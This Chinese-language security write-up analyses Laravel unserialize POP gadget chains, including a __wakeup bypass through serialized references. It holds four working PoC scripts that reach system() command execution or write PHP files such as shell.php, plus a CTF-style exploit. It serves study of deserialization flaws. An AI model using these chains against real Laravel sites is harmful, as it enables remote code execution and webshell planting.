# 环境搭建

直接使用打包好的漏洞环境: https://share.weiyun.com/UZyGDHAC

修改routes/web.php，添加反序列化路由

```
<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

//Route::get('/', function () {
//    return view('welcome');
//});

Route::get('/', function (\Illuminate\Http\Request $request) {

    $vuln = base64_decode($request->input("vuln"));
    unserialize($vuln);
    return "Hello DawnT0wn";
});
```

# POP1

## 漏洞复现

POC如下

```
<?php

namespace Illuminate\Contracts\Queue {

    interface ShouldQueue
    {
    }
}

namespace Illuminate\Bus {

    class Dispatcher
    {
        protected $container;
        protected $pipeline;
        protected $pipes = [];
        protected $handlers = [];
        protected $queueResolver;
        function __construct()
        {
            $this->queueResolver = "system";
        }
    }
}

namespace Illuminate\Broadcasting {

    use Illuminate\Contracts\Queue\ShouldQueue;

    class BroadcastEvent implements ShouldQueue
    {
        function __construct()
        {
        }
    }

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        function __construct()
        {
            $this->event = new BroadcastEvent();
            $this->event->connection = "calc";
            $this->events = new \Illuminate\Bus\Dispatcher();
        }
    }
}

namespace {
    $pop = new \Illuminate\Broadcasting\PendingBroadcast();
    echo base64_encode(serialize($pop));
}
```

![image-20220627202510047](images/1.png)

注意这条链子是没有回显的，最后得到的是一个报错界面，但是确实可以命令执行

## 漏洞分析

这条链很短

入口点src/Illuminate/Broadcasting/PendingBroadcast.php，这在之前对laravel5.7的分析也用到过

![image-20220627202625532](images/2.png)

一个参数可控的destruct方法，这里去寻找一个可用的dispatch方法src/Illuminate/Bus/Dispatcher.php

```
public function dispatch($command)
{
    return $this->queueResolver && $this->commandShouldBeQueued($command)
                    ? $this->dispatchToQueue($command)
                    : $this->dispatchNow($command);
}
```

跟进dispatchToQueue

![image-20220627202837852](images/3.png)

一下就看到了参数可控的call_user_func方法了

至于`$connection`参数，在dispatch方法那儿有个三目运算符，跟进commandShouldBeQueued

```
protected function commandShouldBeQueued($command)
{
    return $command instanceof ShouldQueue;
}
```

只要是实现了ShouldQueue的一个类就可以了

但是在call_user_func结束后会进入一个if判断是否实现了Queue接口，这也就是为什么抛出异常的原因，最后看不到命令执行的回显

# POP2

## 漏洞复现

这是个任意文件写入的链子，POC如下

```
<?php

namespace GuzzleHttp\Cookie {

    class SetCookie
    {
        private static $defaults = [
            'Name'     => null,
            'Value'    => null,
            'Domain'   => null,
            'Path'     => '/',
            'Max-Age'  => null,
            'Expires'  => null,
            'Secure'   => false,
            'Discard'  => false,
            'HttpOnly' => false
        ];
        function __construct()
        {
            $this->data['Expires'] = '<?php phpinfo();?>';
            $this->data['Discard'] = 0;
        }
    }

    class CookieJar
    {
        private $cookies = [];
        private $strictMode;
        function __construct()
        {
            $this->cookies[] = new SetCookie();
        }
    }

    class FileCookieJar extends CookieJar
    {
        private $filename;
        private $storeSessionCookies;
        function __construct()
        {
            parent::__construct();
            $this->filename = "shell.php";
            $this->storeSessionCookies = true;
        }
    }
}

namespace {
    $pop = new \GuzzleHttp\Cookie\FileCookieJar();
    echo base64_encode(serialize($pop));
}
```

![image-20220627222524551](images/4.png)

## 漏洞分析

入口点src/Cookie/FileCookieJar.php的destruct方法

![image-20220719192321817](images/5.png)

根据save

![image-20220719210243914](images/6.png)

看到了明显的file_put_contents方法可以写文件，文件名是刚才传进来可控的`$this-filename`，接下来看看文件内容怎么控制，与`$json`有关，那就从foreach里面开始看吧

`$this`中有这些变量

![image-20220719210611486](images/7.png)

来看看shouldPersist这个静态方法

![image-20220719210637227](images/8.png)

传入的参数是一个SetCookie接口的参数，所以这里需要把CookieJar里面的`$cookie`参数设置为SetCookie的实例化，然后在这个类里面调用对应的方法，其他几个变量根本进不到这一步，所以这里只需要去看这一次foreach执行后`$json`的值即可

先来看看getExpires和getDiscard方法吧

```
public function getExpires()
{
    return $this->data['Expires'];
}
```

```
public function getDiscard()
{
    return $this->data['Discard'];
}
```

返回的是data数组里面的一个值，这里目前就只是控制变量然后可以进入if返回true

回到save方法，进入if后跟进toArray方法，然后赋值给$json

```
public function toArray(): array
{
    return $this->data;
}
```

这里是返回刚才的所有值，综合shouldPersist来看`$this->data['Expires']`可以控制为对应的文件内容即可

然后转化为json数组写入对应的文件

![image-20220719211338093](images/9.png)

# POP3

## 绕过wakeup

这之前先来了解一下如何绕过wakeup，在php版本低的时候，我们可以更改序列化数据元素个数大于实际的来对wakeup魔术方法进行一个绕过，但是当版本高的时候就不行了，这里学习一下最新的对wakeup的绕过

来看这样一个demo

```
<?php
class Foo
{
    public $bitch;
    public $fuck;
    public $c;

    public function __destruct()
    {
        $this->bitch = "bitch";
        $this->c = "bbb";
        var_dump($this->fuck);
        $this->bitch = "aaa";
        var_dump($this->fuck);
    }

    public function __wakeup()
    {
        $this->fuck = 'fuck';
    }
}
$s = 'O:3:"Foo":3:{s:5:"bitch";N;s:1:"c";N;s:4:"fuck";R:2;}';
$o = unserialize($s);
var_dump($o->fuck);
```

在最后代码执行完`var_dump($o->fuck);`会调用destruct方法，来看看输出结果

![image-20220720165852287](images/10.png)

可以看到这里的wakeup是执行了的，在反序列化的时候直接就调用了wakeup对fuck属性进行赋值，但是fuck属性随着bitch的值的改变而发生了变化

网上大多数的demo都是两个属性，经过测试，我发现`s:4:"fuck";R:2;`这个东西是将fuck与传入的序列化数据的第一个属性的值相关联，也就是这了的bitch，与c是无关的，如果c在第一个的话，那就是与c的值相关联的

其实在这个地方，不能说完全地说绕过了wakeup的执行，而是将一个在wakeup里面被强制赋值的属性的值与另外的属性相关联，从而通过其他属性值的修改我们所需要的值来达到绕过的效果

其实这个R:2就是一个取地址的思想我们可以来看看这个实验

### 实验

题目

```
<?php
error_reporting(0);

class b
{
  private $b1;
  private $b2;

  public function __wakeup()
  {
    echo 2;
    $this->b1->$hhh;
    exit();
  }
}

class c
{
  private $c1;
  private $c2;
  public function __destruct()
  {
    echo 4;
    echo $this->c1;
  }

  public function __wakeup()
  {
    echo 1;
    $this->c1 = "don't hack me!!!";
  }

  public function __call($name, $args)
  {
    $func = $this->c2[$name];
    if (!in_array($func, get_defined_functions())) {
      $func(...$args);
    }
  }
}

class e{
  public $e1;
  public $e2;
  public function __get($ddd)
  {
    echo 3;
    $this->e1 = $this->e2;
//    echo $this->e1;
    return $this->e1;
  }
}
if(isset($_POST['ser'])){
  $ser = $_POST['ser'];
    $obj = unserialize($ser);

}else{
  highlight_file(__FILE__);
}
```

我们需要去改变c类中c1的值

exp

```
<?php
error_reporting(0);

class b
{
  public $b1;
  public $b2;
  public function __construct($b1,$b2)
  {
    $this->b1 = $b1;
    $this->b2 = $b2;
  }
}

class c
{
  public $c1;
  public $c2;
  public function __construct($c1,$c2)
  {
    $this->c1 = $c1;
    $this->c2 = $c2;
  }

}

class e{
    public $e1;
    public $e2;
    public function __construct($e1,$e2)
    {
        $this->e1 = $e1;
        $this->e2 = $e2;
    }
}

$c = new c('','');
$e =  new e("hhh","DawnT0wn");
$c->c1 = &$e->e1;
// $c->c2 = new b(new e("hhh","DawnT0wn"),"b2");
$b = new b($e,$c);
echo urlencode(serialize($b));
```

先让他执行内层的wakeup，再执行外层的wakeup对其重新进行复制

解密看到反序列化内容

![image-20221202134941985](images/11.png)

c1的值是R:3，反序列化输出内容看到c1的值可以被改变

![image-20221202135028632](images/12.png)

## 漏洞复现

POC如下

```
<?php

namespace Faker {
    class Generator
    {
        protected $providers = [];
        protected $formatters = [];
        function __construct()
        {
            $this->formatter = "dispatch";
            $this->formatters = 9999;
        }
    }
}

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        public function __construct()
        {
            $this->event = "whoami";
            $this->events = new \Faker\Generator();
        }
    }
}

namespace Symfony\Component\Mime\Part {
    abstract class AbstractPart
    {
        private $headers = null;
    }

    class SMimePart extends AbstractPart
    {
        protected $_headers;
        public $DawnT0wn;
        function __construct()
        {
            $this->_headers = ["dispatch" => "system"];
            $this->DawnT0wn = new \Illuminate\Broadcasting\PendingBroadcast();
        }
    }
}


namespace {
    $pop = new \Symfony\Component\Mime\Part\SMimePart();
    $ser = preg_replace("/([^\{]*\{)(.*)(s:49.*)(\})/", "\\1\\3\\2\\4", serialize($pop));
    echo base64_encode(str_replace("i:9999", "R:2", $ser));
}
```

![image-20220720170748370](images/13.png)

## 漏洞分析

在 laravel < v5.7 , yii2 < 2.0.38 的情况下， `Faker\Generator` 是非常好用的反序列化 gagdet ，但是从 `FakerPHP v 1.12.1` 之后， `Generator.php` 中加了个 `__wakeup()` 方法

![image-20220720171514252](images/14.png)

我们在这个gadget中，就需要去寻找一个在`Faker\Generator` 的wakeup执行之后，对某个参数进行赋值的方法，然后再将formatters与这个参数绑定，从而改变这里formatters的值

这里就可以去找一些存在赋值的wakeup方法，其中最好有类似这样的代码

```
$this->demo1 = $this->demo2;

$this->demo1[$this->demo2] = $this->demo3;
```

就是存在可控的赋值，这里师傅们找到了一个类Symfony\Component\Mime\Part\SMimePart.php的wakeup

```
public function __wakeup(): void
{
    $r = new \ReflectionProperty(AbstractPart::class, 'headers');
    $r->setAccessible(true);
    $r->setValue($this, $this->_headers);
    unset($this->_headers);
}
```

这个类来自 https://github.com/symfony/mime ，其 `$headers` 属性继承自其父类 `AbstractPart`，`__wakeup()` 当中使用反射给 `$headers` 赋值

翻看 git log ，可以看到从项目建立开始，这个 `SMimePart` 的 `__wakeup()` 就存在，而且没有变过（ 也就是说凡是使用了 `symfony/mime` 这个依赖的项目，其 `__wakeup()` 都可能可以绕过 ）

师傅还找到了`Part/DataPart.php` 和 `Part/TextPart.php` 的 `__wakeup()` 也 和 `Part/SMimePart.php` 大致相同，一样可以被用作 gadget

这里贴一个参考链接http://tttang.com/archive/1603/

序列化数据如下

```
O:37:"Symfony\Component\Mime\Part\SMimePart":3:{s:49:"Symfony\Component\Mime\Part\AbstractPartheaders";N;s:11:"*_headers";a:1:{s:8:"dispatch";s:6:"system";}s:8:"DawnT0wn";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:5:"event";s:6:"whoami";s:6:"events";O:15:"Faker\Generator":3:{s:12:"*providers";a:0:{}s:13:"*formatters";i:9999;s:9:"formatter";s:8:"dispatch";}}}

只需要将i:9999改为R:2即可
```

在反序列化中，我们会先调用最内层的wakeup方法，所以`Faker\Generator` 的wakeup会最先执行，然后在执行`SMimePart` 的 `__wakeup()` 方法，

![image-20220720173956400](images/15.png)

接下来进入PendingBroadcast的destruct方法，也就是之前见到过的gadget了

```
public function __destruct()
{
    $this->events->dispatch($this->event);
}
```

参数均可控来到Generator的call方法

```
public function __call($method, $attributes)
{
    return $this->format($method, $attributes);
}
```

跟进format方法

```
public function format($format, $arguments = [])
{
    return call_user_func_array($this->getFormatter($format), $arguments);
}
```

`$arguments`是`$this->event`的值，`$format`是`$this->events`的值（dispatch），跟进getFormatter方法

![image-20220720174745080](images/16.png)

只要存在$`this->formatters["dispatch"]`就直接返回值，那为system就行了

那直接调用`system('whoami')`命令执行了

# POP4

其实也不是什么新链子，都是对wakeup的一个绕过，只贴个POC就是了

```
<?php

namespace Faker {
    class Generator
    {
        protected $providers = [];
        protected $formatters = [];
        function __construct()
        {
            $this->formatter = "register";
            $this->formatters = 9999;
        }
    }
}

namespace Illuminate\Routing {
    class PendingResourceRegistration
    {
        protected $registrar;
        protected $name;
        protected $controller;
        protected $options = [];
        protected $registered = false;
        function __construct()
        {
            $this->registrar = new \Faker\Generator();
            $this->name = "./laravel.php";
            $this->controller = "<?php phpinfo();";
            $this->options = 8;
        }
    }
}

namespace Symfony\Component\Mime\Part {
    abstract class AbstractPart
    {
        private $headers = null;
    }
    class SMimePart extends AbstractPart
    {
        protected $_headers;
        public $DawnT0wn;
        function __construct()
        {
            $this->_headers = ["register" => "file_put_contents"];
            $this->DawnT0wn = new \Illuminate\Routing\PendingResourceRegistration();
        }
    }
}


namespace {
    $pop = new \Symfony\Component\Mime\Part\SMimePart();
    $ser = preg_replace("/([^\{]*\{)(.*)(s:49.*)(\})/", "\\1\\3\\2\\4", serialize($pop));
    echo base64_encode(str_replace("i:9999", "R:2", $ser));
}
```





参考链接

https://xz.aliyun.com/t/11362

http://tttang.com/archive/1603/
